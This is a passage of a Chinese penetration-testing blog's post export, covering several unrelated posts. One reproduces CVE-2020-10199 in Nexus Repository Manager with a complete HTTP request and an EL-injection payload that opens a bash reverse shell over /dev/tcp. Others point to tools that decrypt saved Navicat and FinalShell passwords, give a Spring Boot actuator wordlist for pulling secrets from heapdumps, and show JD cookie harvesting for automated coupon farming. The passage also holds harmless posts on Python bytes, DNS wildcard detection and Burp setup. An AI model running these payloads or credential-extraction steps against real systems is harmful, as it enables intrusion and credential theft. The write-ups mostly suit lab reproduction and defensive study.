MySQL、Oracle、PostgreSQL、SQLite、SQL Server、MariaDB和/或 MongoDB 等不同类型的数据库，并支持管理某些云数据库，例如阿里云、腾讯云。 连接信息是存在注册表里面 数据库 注册表位置 MySQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers&lt;your connection name&gt; MariaDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMARIADB\\Servers&lt;your connection name&gt; MicrosoftSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMSSQL\\Servers&lt;your connection name&gt; Oracle HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatOra\\Servers&lt;your connection name&gt; PostgreSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatPG\\Servers&lt;your connection name&gt; SQLite HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatSQLite\\Servers&lt;your connection name&gt; MongoDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMONGODB\\Servers&lt;your connection name&gt; TeamViewer，FileZilla，WinSCP，Xmangager系列产品（Xshell,Xftp)等工具 三、解密姿势工具地址： https://github.com/passer-W/FinalShell-Decoder https://github.com/uknowsec/SharpDecryptPwd FinallShell 密码解密 可在文本框中直接输入路径或点击选择按钮选择FinalShell配置文件根路径，一般在 **%FINALSHELL_INSTALL_PATH%/conn** 目录下： 也可将远程主机文件下载到本地解密，输入合法路径后自动生成所有主机配置信息： 对密码已保存在Windows系统上的部分程序进行解析，包括：Navicat，TeamViewer，FileZilla，WinSCP，Xmanager系列产品（Xshell、Xftp）。以Navicat为例 四、参考链接https://mp.weixin.qq.com/s/etVdauWL4jbcY1yTKe5zkw","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"w01ke"},{"title":"CVE-2020-10199：Nexus Repository Manager 3 group后台远程命令执行漏洞","slug":"Nexus-Repository-Manager-3-远程命令执行漏洞（CVE-2020-10199）","date":"2023-02-06T02:56:21.000Z","updated":"2023-02-06T03:31:22.240Z","comments":true,"path":"post/bddc5cf6.html","link":"","permalink":"https://wolke.cn/post/bddc5cf6.html","excerpt":"","text":"一、简介nexus的全称是Nexus Repository Manager，是Sonatype公司的一个产品。它是一个强大的仓库管理器，极大地简化了内部仓库的维护和外部仓库的访问。 主要用它来搭建公司内部的maven私服。但是它的功能不仅仅是创建maven私有仓库这么简单，还可以作为nuget、docker、npm、bower、pypi、rubygems、git lfs、yum、go、apt等的私有仓库，功能非常强大。 二、漏洞概述在 Nexus Repository Manager OSS/Pro 3.21.1 及之前的版本中，由于后台存在一处任意EL表达式注入漏洞，导致经过授权认证的攻击者，可以在远程通过构造恶意的 HTTP 请求，在服务端执行任意恶意代码，获取系统权限。此漏洞的利用需要攻击者具备任意类型的账号权限。 三、影响版本Nexus Repository Manager OSS/Pro 3.x &lt;= 3.21.1 四、网络测绘app=”Nexus-Repository-Manager” 五、环境部署cd /usr/local/vulhub/nexus/CVE-2020-10199sudo docker-compose up -d 六、漏洞复现访问：http://ip:8081 进入登录页面 强制修改默认口令（可设置为原口令/弱口令） 使用admin/admin登录后台后，登录后使用f12找到cookie复制当前的csrf-Token 使用burp进行抓包，替换以下数据包，然后把自己的cookie和csrf-Token粘贴上去，然后发包即可看到执行了9*9 POST /service/rest/beta/repositories/go/group HTTP/1.1Host: 192.168.64.139:8081Content-Length: 151X-Requested-With: XMLHttpRequestX-Nexus-UI: trueUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0NX-ANTI-CSRF-TOKEN: 0.13458863892030704Content-Type: application/jsonAccept: */*Origin: http://192.168.64.139:8081Referer: http://192.168.64.139:8081Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: NX-ANTI-CSRF-TOKEN=0.13458863892030704; NXSESSIONID=a576d9e8-10a7-4ba4-a8af-08cc63845895Connection: close&#123;&quot;name&quot;: &quot;internal&quot;,&quot;online&quot;: true,&quot;storage&quot;: &#123;&quot;blobStoreName&quot;: &quot;default&quot;,&quot;strictContentTypeValidation&quot;: true&#125;,&quot;group&quot;: &#123;&quot;memberNames&quot;: [&quot;$\\\\A&#123;9*9&#125;&quot;]&#125;&#125; 把执行9*9修改为创建一个文件，进入docker中查看创建成功 $\\\\A&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethods()[6].invoke(null).exec(&#x27;touch /tmp/success&#x27;)&#125; 使用nc进行监听，执行反弹shell把执行写入文件的payload修改成反弹shell的命令，点击发送查看nc的监听看到返回了shell $\\\\A&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethods()[6].invoke(null).exec(&#x27;/bin/bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/ip/port&lt;&amp;1&#x27;)&#125; 七、修复建议升级至最新版本","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Nexus","slug":"Nexus","permalink":"https://wolke.cn/tags/Nexus/"}],"author":"w01ke"},{"title":"对于Spring Boot的渗透姿势","slug":"对于Spring-Boot的渗透姿势","date":"2023-01-31T05:50:11.000Z","updated":"2023-01-31T06:14:24.617Z","comments":true,"path":"post/115ad433.html","link":"","permalink":"https://wolke.cn/post/115ad433.html","excerpt":"","text":"文章转载于https://blog.zgsec.cn/index.php/archives/129/ 一、Spring Boot概述Spring Boot 是由Pivotal团队提供的全新框架，其设计目的是用来简化 Spring 应用的创建、运行、调试、部署等。使用 Spring Boot 可以做到专注于 Spring 应用的开发，而无需过多关注 XML 的配置。Spring Boot 使用“习惯优于配置”的理念，简单来说，它提供了一堆依赖打包，并已经按照使用习惯解决了依赖问题。使用 Spring Boot 可以不用或者只需要很少的 Spring 配置就可以让企业项目快速运行起来。 Spring Boot 是开发者和 Spring 本身框架的中间层，帮助开发者统筹管理应用的配置，提供基于实际开发中常见配置的默认处理（即习惯优于配置），简化应用的开发，简化应用的运维；总的来说，其目的 Spring Boot 就是为了对 Java web 的开发进行“简化”和加“快”速度，简化开发过程中引入或启动相关 Spring 功能的配置。这样带来的好处就是降低开发人员对于框架的关注点，可以把更多的精力放在自己的业务代码上。 二、Spring Boot Actuator概述Actuator 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。 Actuator 的核心是端点 Endpoint，它用来监视应用程序及交互，spring-boot-actuator 中已经内置了非常多的 Endpoint（health、info、beans、metrics、httptrace、shutdown等等），同时也允许我们自己扩展自己的 Endpoints。每个 Endpoint 都可以启用和禁用。要远程访问 Endpoint，还必须通过 JMX 或 HTTP 进行暴露，大部分应用选择HTTP。 Actuator 在带来方便的同时，如果没有管理好，会导致一些敏感的信息泄露；可能会导致我们的服务器，被暴露到外网，服务器可能会沦陷。 三、Spring Boot框架的识别1、通过icon图标进行识别Fofa语法 icon_hash=&quot;116323821&quot; 可以搜索到25万条左右的资产数据，说明Spring Boot框架是应用广泛哈哈~（其中还有很多服务更改了默认的ico图标，所以这个语法找不到） 2、通过网页内容进行识别哈哈，这个更夸张了，可以搜索到141万条左右的资产数据 以下是 Spring Boot 框架的典型特征： 所以可以通过Fofa对网页的body内容进行搜索找到那么多的资产 3、Spring Boot框架 敏感信息泄露如果对 Spring Boot 框架熟悉的师傅，肯定知道对 Spring Boot 的渗透测试过程中，肯定不会少了敏感信息泄露和未授权访问相关的漏洞 不同版本分类讨论 Spring Boot &lt; 1.5：默认未授权访问所有端点 Spring Boot &gt;= 1.5：默认只允许访问 /health 和 /info 端点，但是此安全性通常被应用程序开发人员禁用了 （1）常见端点及其作用 路径 是否默认启用 功能描述 /auditevents 是 显示当前应用程序的审计事件信息 /beans 是 显示一个应用中所有Spring Beans的完整列表 /conditions 是 显示配置类和自动配置类的状态及它们被应用或未被应用的原因 /configprops 是 显示一个所有@ConfigurationProperties的集合列表 /env 是 显示来自Spring的 ConfigurableEnvironment的属性 /flyway 是 显示数据库迁移路径（如果存在） /health 是 显示应用的健康信息（当使用一个未认证连接访问时显示一个简单的’status’，使用认证连接访问则显示全部信息详情） /info 是 显示任意的应用信息 /liquibase 是 展示任何Liquibase数据库迁移路径（如果存在） /metrics 是 展示当前应用的metrics信息 /mappings 是 显示一个所有@RequestMapping路径的集合列表 /scheduledtasks 是 显示应用程序中的计划任务 /sessions 否 允许从Spring会话支持的会话存储中检索和删除用户会话 /shutdown 否 允许应用以优雅的方式关闭（默认情况下不启用） /threaddump 是 执行一个线程dump /heapdump 是 返回一个GZip压缩的hprof堆dump文件 /jolokia 是 通过HTTP暴露JMX beans（当Jolokia在类路径上时，WebFlux不可用） /logfile 是 返回日志文件内容（如果设置了logging.file或logging.path属性的话），支持使用HTTP Range头接收日志文件内容的部分信息 /prometheus 是 以可以被Prometheus服务器抓取的格式显示metrics信息 （2）独家字典于是，我这里独家整理了一份信息泄露字典（欢迎补充哈哈） actuatoractuator/auditLogactuator/auditeventsactuator/autoconfigactuator/beansactuator/cachesactuator/conditionsactuator/configurationMetadataactuator/configpropsactuator/dumpactuator/envactuator/eventsactuator/exportRegisteredServicesactuator/featuresactuator/flywayactuator/healthactuator/heapdumpactuator/healthcheckactuator/heapdumpactuator/httptraceactuator/hystrix.streamactuator/infoactuator/integrationgraphactuator/jolokiaactuator/logfileactuator/loggersactuator/loggingConfigactuator/liquibaseactuator/metricsactuator/mappingsactuator/scheduledtasksactuator/swagger-ui.htmlactuator/prometheusactuator/refreshactuator/registeredServicesactuator/releaseAttributesactuator/resolveAttributesactuator/scheduledtasksactuator/sessionsactuator/springWebflowactuator/shutdownactuator/ssoactuator/ssoSessionsactuator/statisticsactuator/statusactuator/threaddumpactuator/traceauditeventsautoconfigapi.htmlapi/index.htmlapi/swagger-ui.htmlapi/v2/api-docsapi-docsbeanscachescloudfoundryapplicationconditionsconfigpropsdistv2/index.htmldocsdruid/index.htmldruid/login.htmldruid/websession.htmldubbo-provider/distv2/index.htmldumpentity/allenvenv/(name)eurekaflywaygateway/actuatorgateway/actuator/auditeventsgateway/actuator/beansgateway/actuator/conditionsgateway/actuator/configpropsgateway/actuator/envgateway/actuator/healthgateway/actuator/heapdumpgateway/actuator/httptracegateway/actuator/hystrix.streamgateway/actuator/infogateway/actuator/jolokiagateway/actuator/logfilegateway/actuator/loggersgateway/actuator/mappingsgateway/actuator/metricsgateway/actuator/scheduledtasksgateway/actuator/swagger-ui.htmlgateway/actuator/threaddumpgateway/actuator/tracehealthheapdumpheapdump.jsonhttptracehystrixhystrix.streaminfointegrationgraphjolokiajolokia/listliquibaselistlogfileloggersliquibasemetricsmappingsmonitorprometheusrefreshscheduledtaskssessionsshutdownspring-security-oauth-resource/swagger-ui.htmlspring-security-rest/api/swagger-ui.htmlstatic/swagger.jsonsw/swagger-ui.htmlswaggerswagger/codesswagger/index.htmlswagger/static/index.htmlswagger/swagger-ui.htmlswagger-dubbo/api-docsswagger-uiswagger-ui.htmlswagger-ui/htmlswagger-ui/index.htmlsystem/druid/index.htmlthreaddumptemplate/swagger-ui.htmltraceuser/swagger-ui.htmlversionv1.1/swagger-ui.htmlv1.2/swagger-ui.htmlv1.3/swagger-ui.htmlv1.4/swagger-ui.htmlv1.5/swagger-ui.htmlv1.6/swagger-ui.htmlv1.7/swagger-ui.html/v1.8/swagger-ui.html/v1.9/swagger-ui.html/v2.0/swagger-ui.htmlv2.1/swagger-ui.htmlv2.2/swagger-ui.htmlv2.3/swagger-ui.htmlv2/swagger.jsonwebpage/system/druid/index.html%20/swagger-ui.html （3）端点的敏感信息泄露样例这里先安利一款谷歌浏览器插件哈，名字叫 JSON Viewer ，可以美化JSON的相关页面 a、访问/actuator如果设置了 management.endpoints.web.exposure.include 为 *，就可以在 /actuator 看到所有存在的端点，截图如下： b、访问/actuator/version会泄露一些相关的版本信息 但这个目前很少有泄露了，一时半会没找到实例 c、访问/env或者/actuator/env可能会泄露数据库账号密码等敏感信息 针对env这种路径下泄露的密码会用星号进行脱敏，想要获取相应的明文密码，可以尝试通过分析heapdump数据的方式 d、访问/actuator/metrics获得每个度量的名称，其中主要监控了JVM内容使用、GC情况、类加载信息等 如果想要得到每个度量的详细信息，需要传递度量的名称到URL中，如下 http://xx.xx.xx.xx/actuator/metrics/http.server.requests e、访问/actuator/threaddump获取服务器的线程堆栈信息 f、访问/actuator/loggers获取服务器的日志级别 g、访问/actuator/configprops查看配置文件中设置的属性内容，以及一些配置属性的默认值 h、访问/actuator/info展示了关于应用的一般信息，这些信息从编译文件比如 META-INF/build-info.properties 或者 git 文件比如 git.properties 或者任何环境的 property 中获取 i、访问/actuator/mappings响应信息描述全部的URI路径，以及它们和控制器的映射关系 j、访问/actuator/healthhealth一般只展示了简单的UP和DOWN状态，比如这样： 为了获得健康检查中所有指标的详细信息，就需要通过在 application.yaml 中增加如下内容： management: endpoint: health: show-details: always 一旦打开上述开关，那么在 /health 中可以看到详细内容，比如下面这样 &#123; &quot;status&quot;: &quot;UP&quot;, &quot;diskSpace&quot;: &#123; &quot;status&quot;: &quot;UP&quot;, &quot;total&quot;: 209715195904, &quot;free&quot;: 183253909504, &quot;threshold&quot;: 10485760 &#125; &quot;db&quot;: &#123; &quot;status&quot;: &quot;UP&quot;, &quot;database&quot;: &quot;MySQL&quot;, &quot;hello&quot;: 1 &#125;&#125; k、访问/heapdump或者/actuator/heapdumpHeap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照 Heap Dump是有着多种类型的，不过总体上heap dump在触发快照的时候都保存了java对象和类的信息 通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。其中可能会含有敏感数据，如数据库的密码明文等 直接访问路径会返回一个GZip压缩的JVM堆dump，其中是jvm heap信息。下载的heapdump文件大小通常在 50M—500M 之间，有时候也可能会大于 2G 下载完成之后可以借助一些工具对其中的数据进行内容检索，寻找敏感信息 Eclipse Memory Analyzer（MAT） heapdump_tool JDumpSpider 四、SpringBoot-Scan的使用日常渗透过程中，经常会碰到Spring Boot搭建的微服务，于是就想做一个针对Spring Boot的开源渗透框架 主要用作扫描SpringBoot的敏感信息泄露端点，并可以直接测试Spring Boot的相关高危漏洞。 开源地址：https://github.com/AabyssZG/SpringBoot-Scan 五、参考链接 https://blog.csdn.net/u012206617/article/details/109010102 https://blog.csdn.net/m0_64867220/article/details/121728868 https://www.freebuf.com/vuls/289710.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://wolke.cn/tags/SpringBoot/"}],"author":"w01ke"},{"title":"Python的bytearray和bytes","slug":"Python的bytearray和bytes","date":"2022-12-21T07:33:30.000Z","updated":"2022-12-21T07:37:05.402Z","comments":true,"path":"post/5bd337c9.html","link":"","permalink":"https://wolke.cn/post/5bd337c9.html","excerpt":"","text":"一、bytearray函数简介【描述】 bytearray() 方法返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 &lt;= x &lt; 256。 【语法】 class bytearray([source[, encoding[, errors]]]) 【参数】 如果 source 为整数，则返回一个长度为 source 的初始化数组； 如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列； 如果 source 为可迭代类型，则元素必须为[0 ,255] 中的整数；（刚好是28，一个字节就是8比特） 如果 source 为与 buffer 接口一致的对象，则此对象也可以被用于初始化 bytearray。 如果没有输入任何参数，默认就是初始化数组为0个元素。 【返回值】 返回新字节数组，可变字节序列 bytearray 有一个明显的特征，输出的时候最前面会有一个字符 b 标识。 二、实例a = bytearray() # 定义空的字节序列bytearrayb = bytearray(3) # 定义指定个数的字节序列bytes，默认以0填充，不能是浮点数c = bytearray(&quot;w01ke&quot;, &quot;utf-8&quot;)d = bytearray([1, 2, 3]) # 可迭代类型print(a)print(b)print(c)print(d)try: e = bytearray([1, 2, 256]) # 报错 print(e)except ValueError as f: print(f) ​ 输出 bytearray(b&#x27;&#x27;)bytearray(b&#x27;\\x00\\x00\\x00&#x27;)bytearray(b&#x27;w01ke&#x27;)bytearray(b&#x27;\\x01\\x02\\x03&#x27;)byte must be in range(0, 256) ​ 接下来来探究字节序列具体的每个字节的值是多少 b = bytearray(3) # 定义指定个数的字节序列bytes，默认以0填充，不能是浮点数c = bytearray(&quot;w01ke&quot;, &quot;utf-8&quot;)d = bytearray([1, 2, 3]) # 可迭代类型print(b)for i in range(len(b)): print(b[i])print(c)for i in range(len(c)): print(c[i])print(d)for i in range(len(d)): print(d[i]) ​ 结果如下所示，可以看到每个字节的值就是对应的ASCII码（十进制） bytearray(b&#x27;\\x00\\x00\\x00&#x27;)000bytearray(b&#x27;w01ke&#x27;)1194849107101bytearray(b&#x27;\\x01\\x02\\x03&#x27;)123 三、与bytes函数的区别其他都一样。不同的是bytes为不可变字节序列，可以看作是由一个个byte（二进制0-255数值）组成的str序列。bytearray为可变字节序列，可以看作是一组二进制数值的（0-255）的list序列。举例如下 a = b&#x27;w01ke&#x27; # bytes类型，不可变字节序列print(type(a))for i in a: print(i, end=&quot; &quot;)a[0] = &quot;A&quot; # 会报错&#x27;&#x27;&#x27;输出结果&lt;class &#x27;bytes&#x27;&gt;119 48 49 107 101 Traceback (most recent call last):File &quot;C:\\\\Users\\\\86147\\\\Desktop\\\\demo.py&quot;, line 6, in &lt;module&gt;a[0] = &quot;A&quot;TypeError: &#x27;bytes&#x27; object does not support item assignment&#x27;&#x27;&#x27; ​ 如果换成bytearray类型即可修改内容 a = b&#x27;w01ke&#x27; # bytes类型，不可变字节序列print(type(a))a = bytearray(a)print(type(a))for i in a: print(i, end=&quot; &quot;)a[0] = 65print(&quot;\\n&quot;)print(a)&#x27;&#x27;&#x27;输出结果D:\\\\Python3.7.9\\\\python.exe C:\\\\Users\\\\86147\\\\Desktop\\\\demo.py &lt;class &#x27;bytes&#x27;&gt;&lt;class &#x27;bytearray&#x27;&gt;119 48 49 107 101 bytearray(b&#x27;A01ke&#x27;)&#x27;&#x27;&#x27;","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"}],"author":"w01ke"},{"title":"青龙面板——每日自动拿京豆","slug":"青龙面板——每日自动拿京豆","date":"2022-12-16T15:33:17.000Z","updated":"2022-12-16T15:43:43.879Z","comments":true,"path":"post/e7b0b2b0.html","link":"","permalink":"https://wolke.cn/post/e7b0b2b0.html","excerpt":"","text":"一、前言青龙面板是一个可视化的面板，在上面可以部署我们的计划任务，自动在特定时间执行京东领京豆、京喜牧场养鸡、京东特价版看视频领金币等等。 首先得准备一台云服务器，这里我自己在用的是腾讯云的服务器https://url.cn/mn32xpJz , CentOS 7，价格便宜，限制相比另外一家也少（dddd），控制台开发票也方便。 二、安装docker 已经安装Docker的可以跳过这一步，没有安装的可以使用以下命令直接安装Docker。 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 安装Docker启动Docker，配置开机启动 sudo systemctl start docker #启动Dockersudo systemctl enable docker #配置开机自启 三、安装docker-composesudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose 四、启动容器mkdir qinglongwget https://raw.githubusercontent.com/whyour/qinglong/master/docker/docker-compose.yml# 启动docker-compose up -d# 停止docker-compose down 打开你的浏览器，访问 http://{ip}:5700 五、打开防火墙青龙面板默认端口是5700，记得在防火墙上设置放行。腾讯云可以在安全组中设置 六、配置青龙1、面板处设置初始页面会让我们设置密码以及推送机器人，机器人我选择的是Server酱，当然其实也可以不配置机器人，因为几乎没有什么用，我们需要的只是自动运行脚本，通知这个功能只是次要。 如果忘记了面板密码，可以在该auth.json下找到 cat /root/qinglong/data/config/auth.json 2、添加定时任务青龙面板本身不具备任何脚本功能，只是一个管理和执行相应脚本的平台。 点击定时任务–&gt;添加任务 这里我用的是以下两个库 Fake库：ql repo https://ghproxy.com/https://github.com/shufflewzc/faker2.git &quot;jd_|jx_|getJDCookie&quot; &quot;activity|backUp&quot; &quot;^jd[^_]|USER|ZooFaker_Necklace&quot;KingRan/KR：ql repo https://github.com/KingRan/KR.git &quot;jd_|jx_|jdCookie&quot; &quot;activity|backUp&quot; &quot;^jd[^_]|USER|utils|function|sign|sendNotify|ql|JDJR&quot; 定时规则如下 秒 分 时 天 月 周 3、获取Cookie电脑端可以使用网页登录京东账号后使用开发者工具–Network捕捉Cookie，手机端可以使用Alook浏览器登录后捕捉Cookie。我们获取到的Cookie是很长一串的，但我们只需要pt_key和pt_pin即可，格式如下 pt_key=xxxx;pt_pin=xxxx; 4、新建环境变量环境变量–&gt;添加变量，名称为JD_COOKIE，值为刚复制的京东账号Cookie，备注自己填方便识别，别的不需要动。添加后点确定就可以， 如果需要添加多个账号，只需要获取多个Cookie添加上去就可以了，名称仍然为JD_COOKIE。 pt_key=xxxx;pt_pin=xxxx;&amp;pt_key=xxxx;pt_pin=xxxx; 完毕，接下来等待脚本自己运行即可。 七、其他（1）将京东账号绑定微信：有的活动红包会自动体现到微信，虽然不多，但有 （2）开启京东游戏任务建议把所有活动游戏都点击一次，京东工厂这种需要自己选产品的建议自己选，不然会自动选一个，有的干脆不选。这里给大家说下各个游戏入口位置： 京东APP 摇钱树：京东APP→右下角我的→中间更多工具 东东萌宠：京东APP→右下角我的 宠汪汪：京东APP→右下角我的 东东农场：京东APP→右下角我的 首次下载登陆惊喜APP可以0.01元包邮买东西，&gt;戳我领取&lt; 京喜工厂：惊喜APP→右下角我的 京喜牧场：惊喜APP→右下角我的 京喜财富岛：惊喜APP→右下角我的 首次下载登陆京东特价版可以领5-10元券包邮买东西 发财大赢家：京东极速版→右下角我的 汪汪乐园：京东极速版→右下角我的 （3）购买云服务器享折扣 点击下面链接去购买云服务器：https://url.cn/mn32xpJz 享折扣。","categories":[{"name":"薅羊毛","slug":"薅羊毛","permalink":"https://wolke.cn/categories/%E8%96%85%E7%BE%8A%E6%AF%9B/"}],"tags":[{"name":"薅羊毛","slug":"薅羊毛","permalink":"https://wolke.cn/tags/%E8%96%85%E7%BE%8A%E6%AF%9B/"}],"author":"w01ke"},{"title":"子域名爆破的泛解析问题","slug":"子域名爆破的泛解析问题","date":"2022-11-23T08:54:23.000Z","updated":"2022-11-23T09:02:21.871Z","comments":true,"path":"post/9f38e83a.html","link":"","permalink":"https://wolke.cn/post/9f38e83a.html","excerpt":"","text":"字节跳动——渗透测试实习生面试题：信息收集如何处理子域名爆破的泛解析问题？ 一、什么是域名泛解析 &emsp;&emsp;利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。在域名前添加任何子域名，均可访问到所指向的IP地址。 常规域名解析www.wolke.cn 10.10.10.10域名泛解析*.wolke.cn 10.10.10.10访问子域名a.wolke.cn，b.wolke.cn等均指向10.10.10.10 &emsp;&emsp;这为我们去做子域名爆破带来了极大的不便，以前子域名爆破常用的是layer子域名挖掘机。不过layer子域名挖掘机在跑具有泛解析的站的时候，就不是那么适用 二、域名泛解析对抗 &emsp;&emsp;这里以淘宝和百度为例子：ping一个绝对随机不可能存在的域名，它解析了，那么说明它大概率使用了泛解析 &emsp;&emsp;淘宝可能存在域名泛解析👇 &emsp;&emsp;百度可能不存在域名泛解析👇 &emsp;&emsp;针对百度，我们可以直接使用layer子域名挖掘机等子域名爆破工具，而针对淘宝的资产,我们不能使用layer子域名挖掘机等常规工具 1、判断是否使用了泛解析&emsp;&emsp;思路：五次完全随机的域名前缀A记录解析 import asyncioimport aiodnsimport randomloop = asyncio.get_event_loop()resolver = aiodns.DNSResolver(loop=loop)async def query(name, query_type): return await resolver.query(name, query_type)def random_to_A(main_domain): total = [] # 随机循环五次 for i in range(5): sub_domain = &quot;&quot;.join(random.sample(&#x27;abcdefghijklmnopqrstuvwxyz&#x27;, random.randint(8, 12))) res = query(sub_domain + &quot;.&quot; + main_domain, &#x27;A&#x27;) result = loop.run_until_complete(res) total.append(result) return totalif __name__ == &#x27;__main__&#x27;: main_domain = input(&quot;Please input the main_doamin: &quot;) print(str(random_to_A(main_domain)).replace(&quot;],&quot;, &quot;],\\n&quot;)) &emsp;&emsp;五次完全A记录解析成功，认为存在泛解析，如果不存在泛解析问题，就常规子域名收集一把梭，如果检测出泛解析，就使用破泛解析的子域名爆破工具。 2、CNAME查询黑名单&emsp;&emsp;思路：维护特定厂商CNAME列表 &emsp;&emsp;CNAME查询几个不存在的淘宝域名，也是一样的思路，循环多次不存在的域名，如果访问不存在的域名，CNAME为shop.taobao.com 3、A记录查询命中次数&emsp;&emsp;如果A记录查询，命中相同ip&gt;10，后续的爆破A记录解析的域名就不展示记录 三、脚本源码&emsp;&emsp;附上自己编写的简单的泛解析识别脚本源码 import asyncioimport aiodnsimport randomimport optparseloop = asyncio.get_event_loop()resolver = aiodns.DNSResolver(loop=loop)async def query(name, query_type): return await resolver.query(name, query_type)def random_to_A(main_domain): total = [] # 随机循环五次 for i in range(5): sub_domain = &quot;&quot;.join(random.sample(&#x27;abcdefghijklmnopqrstuvwxyz&#x27;, random.randint(8, 12))) res = query(sub_domain + &quot;.&quot; + main_domain, &#x27;A&#x27;) result = loop.run_until_complete(res) total.append(result) return totaldef random_to_cname(sub_domain): res = query(sub_domain, &#x27;CNAME&#x27;) result = loop.run_until_complete(res) return resultif __name__ == &#x27;__main__&#x27;: parser = optparse.OptionParser(&quot;%prog &quot; + &quot;[options] [domain]&quot;) parser.add_option(&#x27;-a&#x27;, action=&quot;store&quot;, dest=&#x27;main_domain&#x27;, type=&#x27;string&#x27;, help=&#x27;&#x27;) parser.add_option(&#x27;-c&#x27;, action=&quot;store&quot;, dest=&#x27;sub_domain&#x27;, type=&#x27;string&#x27;, help=&#x27;&#x27;) (options, args) = parser.parse_args() main_domain = options.main_domain sub_domain = options.sub_domain if main_domain: print(str(random_to_A(main_domain)).replace(&quot;],&quot;, &quot;],\\n&quot;)) elif sub_domain: print(str(random_to_cname(sub_domain)).replace(&quot;&lt;&quot;, &quot;\\n&lt;&quot;)) 四、参考链接 https://www.cnblogs.com/piaomiaohongchen/p/15959042.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"信息收集","slug":"信息收集","permalink":"https://wolke.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"子域名爆破","slug":"子域名爆破","permalink":"https://wolke.cn/tags/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"}],"author":"w01ke"},{"title":"一次burp无法抓微信PC端小程序的头疼经历以及解决方案","slug":"使用burp对微信公众号、小程序抓包","date":"2022-08-22T16:37:23.000Z","updated":"2022-08-22T17:10:08.072Z","comments":true,"path":"post/af7cceea.html","link":"","permalink":"https://wolke.cn/post/af7cceea.html","excerpt":"","text":"今天想用burp对PC的微信小程序进行渗透测试，发现怎么抓也抓不到，明明之前可以抓的，经过几小时的研究和资料搜集，终于解决。顺手把如何对手机/模拟器进行抓包也写了下，在文末我会提到是如何解决这个头疼且深刻的问题，这个问题我相信大家应该都会有，希望能帮助到大家。 一、抓手机/模拟器的微信公众号、小程序、APP前提：保证电脑和手机在同一局域网 （1）初阶电脑端使用ipconfig查看当前IP地址 手机端打开WLAN设置，手动指定代理，代理IP地址为电脑端的IP地址例如上面的192.168.43.170，端口设置为例如8081 此时打开burp，设置监听（非本地回环地址） 此时，burp就能抓手机访问网页的包了。 但是对于一些HTTPS的站点，手机访问会弹出警告——证书不受信任 点击确定继续后，burp才可以抓到该数据包 （2）进阶上面的方法很快就能用手机进行渗透测试，但是有一个问题：对HTTPS站点的渗透很繁琐甚至无效，以及对微信公众号(抓不全)和小程序会出现抓不到包、无法抓取app的情况。在手机导入一个burp证书即可 手机设置好代理后，访问http://burp 下载证书，下载的一般默认是der格式，修改成cer格式，然后从存储设备安装即可，凭据用途可以“WLAN”、“VPN和应用”都安装。 安装好证书后，即可抓取公众号、小程序、app的包 二、抓电脑端微信公众号、小程序burp设置好代理，导出证书 打开Edge浏览器——设置——隐私、搜索和服务——管理证书，下载证书并导入，注意一定是选择受信任的根证书颁发机构 导入好证书后，设置好代理 按理来说，这样就可以抓到公众号和小程序的包了，但实际情况是完全抓不到小程序的包。 我们可以退出微信PC端，将目录C:\\Users\\用户名\\AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins\\WMPFRuntime目录下的所有文件删除 重新登录微信，再次尝试抓小程序的包，就可以抓到包了。 可能有的师傅没有这个目录，我们可以随便打开一个微信小程序，打开任务管理器，定位到小程序的进程，打开文件所在位置 回退到Plugins目录下，进入WMPFRuntime文件夹，退出微信，删除该文件夹目录下所有文件，重新登录微信PC端即可抓到小程序的包。 